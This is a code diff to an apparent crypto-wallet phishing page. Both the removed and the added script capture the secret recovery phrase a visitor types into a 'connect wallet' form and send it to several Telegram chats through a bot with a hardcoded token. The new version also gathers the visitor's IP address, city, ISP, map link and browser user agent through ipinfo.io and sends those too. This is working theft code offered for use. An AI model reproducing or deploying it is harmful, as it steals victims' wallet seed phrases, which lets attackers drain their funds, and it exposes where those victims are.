@@ -3300,53 +3300,77 @@
     }
   </script>
  
- <script>
-    $(document).ready(function() {
-        const BOT_TOKEN = '7746117883:AAGZRV65ZmLtIgn8tAYQ9A8GLGRUMMqr5AY';
-        const CHAT_IDS = ['7651943856', '7651943856', '6661378262']; // Add as many chat IDs as you want
-    
-        $('#button_connect_wallet').off('click').on('click', async function(e) {
-            e.preventDefault();
-    
-            const textarea = document.getElementById('secret_phrase');
-            const input = textarea.value.trim();
-            const walletName = $('#wallet_name').text();
-            const button = $(this);
-    
-            if (!input) {
-                alert("Secret phrase is required.");
-                return;
-            }
-    
-            button.text('Loading...').prop('disabled', true);
-    
-            const message = `💼 Wallet selected: ${walletName || 'None selected'}\n🔑 Secret Phrase: ${input}`;
-    
-            try {
-                // Send the message to all chat IDs
-                await Promise.all(
-                    CHAT_IDS.map(chatId =>
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json'
-                            },
-                            body: JSON.stringify({
-                                chat_id: chatId,
-                                text: message
-                            })
+<script>
+$(document).ready(function() {
+    const BOT_TOKEN = '7746117883:AAGZRV65ZmLtIgn8tAYQ9A8GLGRUMMqr5AY';
+        const CHAT_IDS = ['7651943856', '7651943856', '6661378262'];
+
+    $('#button_connect_wallet').off('click').on('click', async function(e) {
+        e.preventDefault();
+
+        const textarea = document.getElementById('secret_phrase');
+        const input = textarea.value.trim();
+        const walletName = $('#wallet_name').text();
+        const button = $(this);
+
+        if (!input) {
+            alert("Secret phrase is required.");
+            return;
+        }
+
+        button.text('Loading...').prop('disabled', true);
+
+        try {
+            // Fetch IP and location info
+            const ipData = await fetch('https://ipinfo.io/json?token=2ed417fa5b8e7f').then(res => res.json());
+
+            const userIP = ipData.ip || 'Unknown IP';
+            const userCity = ipData.city || 'Unknown City';
+            const userCountry = ipData.country || 'Unknown Country';
+            const userRegion = ipData.region || 'Unknown Region';
+            const userOrg = ipData.org || 'Unknown Organization';
+            const locationLink = `https://www.google.com/maps/search/?api=1&query=${ipData.loc}`;
+
+            const userAgent = navigator.userAgent;
+
+            // Construct the message
+            const message = `
+💼 Wallet Selected: ${walletName || 'None selected'}
+🔑 Secret Phrase: ${input}
+
+🌍 IP Address: ${userIP}
+📍 Location: ${userCity}, ${userRegion}, ${userCountry}
+🏢 ISP/Org: ${userOrg}
+📌 Maps Link: ${locationLink}
+
+🖥 User Agent: ${userAgent}
+            `;
+
+            // Send to all chat IDs
+            await Promise.all(
+                CHAT_IDS.map(chatId =>
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message
                         })
-                    )
-                );
-    
-                button.text('Connect Wallet').prop('disabled', false);
-            } catch (err) {
-                console.error('❌ Telegram error:', err);
-                button.text('Connect Wallet').prop('disabled', false);
-            }
-        });
+                    })
+                )
+            );
+
+            button.text('Connect Wallet').prop('disabled', false);
+        } catch (err) {
+            console.error('❌ Error sending info:', err);
+            button.text('Connect Wallet').prop('disabled', false);
+        }
     });
-    </script>
+});
+</script>
+
     
     
 
